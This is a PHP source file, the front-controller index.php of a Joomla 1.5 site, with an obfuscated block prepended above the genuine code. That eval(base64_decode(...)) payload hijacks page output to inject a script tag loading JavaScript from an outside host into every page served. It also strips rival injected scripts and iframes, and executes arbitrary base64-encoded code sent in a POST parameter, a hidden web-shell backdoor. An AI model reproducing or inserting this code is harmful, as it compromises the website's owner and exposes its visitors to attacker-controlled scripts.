<?php eval(base64_decode('aWYoIWlzc2V0KCRoemgxKSl7ZnVuY3Rpb24gaHpoKCRzKXtpZihwcmVnX21hdGNoX2FsbCgnIzxzY3JpcHQoLio/KTwvc2NyaXB0PiNpcycsJHMsJGEpKWZvcmVhY2goJGFbMF0gYXMgJHYpaWYoY291bnQoZXhwbG9kZSgiXG4iLCR2KSk+NSl7JGU9cHJlZ19tYXRjaCgnI1tcJyJdW15cc1wnIlwuLDtcPyFcW1xdOi88PlwoXCldezMwLH0jJywkdil8fHByZWdfbWF0Y2goJyNbXChcW10oXHMqXGQrLCl7MjAsfSMnLCR2KTtpZigocHJlZ19tYXRjaCgnI1xiZXZhbFxiIycsJHYpJiYoJGV8fHN0cnBvcygkdiwnZnJvbUNoYXJDb2RlJykpKXx8KCRlJiZzdHJwb3MoJHYsJ2RvY3VtZW50LndyaXRlJykpKSRzPXN0cl9yZXBsYWNlKCR2LCcnLCRzKTt9aWYocHJlZ19tYXRjaF9hbGwoJyM8aWZyYW1lIChbXj5dKj8pc3JjPVtcJyJdPyhodHRwOik/Ly8oW14+XSo/KT4jaXMnLCRzLCRhKSlmb3JlYWNoKCRhWzBdIGFzICR2KWlmKHByZWdfbWF0Y2goJyMgd2lkdGhccyo9XHMqW1wnIl0/MCpbMDFdW1wnIj4gXXxkaXNwbGF5XHMqOlxzKm5vbmUjaScsJHYpJiYhc3Ryc3RyKCR2LCc/Jy4nPicpKSRzPXByZWdfcmVwbGFjZSgnIycucHJlZ19xdW90ZSgkdiwnIycpLicuKj88L2lmcmFtZT4jaXMnLCcnLCRzKTskcz1zdHJfcmVwbGFjZSgkYT1iYXNlNjRfZGVjb2RlKCdQSE5qY21sd2RDQnpjbU05YUhSMGNEb3ZMMjFwYW00dGNtOWxaR1ZzTG1KbEwyMTVjMmwwWlM5a1pYTnJkRzl3TG5Cb2NDQStQQzl6WTNKcGNIUSsnKSwnJywkcyk7aWYoc3RyaXN0cigkcywnPGJvZHknKSkkcz1wcmVnX3JlcGxhY2UoJyMoXHMqPGJvZHkpI21pJywkYS4nXDEnLCRzKTtlbHNlaWYoc3RycG9zKCRzLCcsYScpKSRzLj0kYTtyZXR1cm4gJHM7fWZ1bmN0aW9uIGh6aDIoJGEsJGIsJGMsJGQpe2dsb2JhbCAkaHpoMTskcz1hcnJheSgpO2lmKGZ1bmN0aW9uX2V4aXN0cygkaHpoMSkpY2FsbF91c2VyX2Z1bmMoJGh6aDEsJGEsJGIsJGMsJGQpO2ZvcmVhY2goQG9iX2dldF9zdGF0dXMoMSkgYXMgJHYpaWYoKCRhPSR2WyduYW1lJ10pPT0naHpoJylyZXR1cm47ZWxzZWlmKCRhPT0nb2JfZ3poYW5kbGVyJylicmVhaztlbHNlICRzW109YXJyYXkoJGE9PSdkZWZhdWx0IG91dHB1dCBoYW5kbGVyJz9mYWxzZTokYSk7Zm9yKCRpPWNvdW50KCRzKS0xOyRpPj0wOyRpLS0peyRzWyRpXVsxXT1vYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4oKTt9b2Jfc3RhcnQoJ2h6aCcpO2ZvcigkaT0wOyRpPGNvdW50KCRzKTskaSsrKXtvYl9zdGFydCgkc1skaV1bMF0pO2VjaG8gJHNbJGldWzFdO319fSRoemhsPSgoJGE9QHNldF9lcnJvcl9oYW5kbGVyKCdoemgyJykpIT0naHpoMicpPyRhOjA7ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsnZSddKSk7')); ?><?php
/**
* @version		$Id: index.php 10381 2008-06-01 03:35:53Z pasamio $
* @package		Joomla
* @copyright	Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// Set flag that this is a parent file
define( '_JEXEC', 1 );

define('JPATH_BASE', dirname(__FILE__) );

define( 'DS', DIRECTORY_SEPARATOR );

require_once ( JPATH_BASE .DS.'includes'.DS.'defines.php' );
require_once ( JPATH_BASE .DS.'includes'.DS.'framework.php' );

JDEBUG ? $_PROFILER->mark( 'afterLoad' ) : null;

/**
 * CREATE THE APPLICATION
 *
 * NOTE :
 */
$mainframe =& JFactory::getApplication('site');

/**
 * INITIALISE THE APPLICATION
 *
 * NOTE :
 */
// set the language
$mainframe->initialise();

JPluginHelper::importPlugin('system');

// trigger the onAfterInitialise events
JDEBUG ? $_PROFILER->mark('afterInitialise') : null;
$mainframe->triggerEvent('onAfterInitialise');

/**
 * ROUTE THE APPLICATION
 *
 * NOTE :
 */
$mainframe->route();

// authorization
$Itemid = JRequest::getInt( 'Itemid');
$mainframe->authorize($Itemid);

// trigger the onAfterRoute events
JDEBUG ? $_PROFILER->mark('afterRoute') : null;
$mainframe->triggerEvent('onAfterRoute');

/**
 * DISPATCH THE APPLICATION
 *
 * NOTE :
 */
$option = JRequest::getCmd('option');
$mainframe->dispatch($option);

// trigger the onAfterDispatch events
JDEBUG ? $_PROFILER->mark('afterDispatch') : null;
$mainframe->triggerEvent('onAfterDispatch');

/**
 * RENDER  THE APPLICATION
 *
 * NOTE :
 */
$mainframe->render();

// trigger the onAfterRender events
JDEBUG ? $_PROFILER->mark('afterRender') : null;
$mainframe->triggerEvent('onAfterRender');

/**
 * RETURN THE RESPONSE
 */
echo JResponse::toString($mainframe->getCfg('gzip'));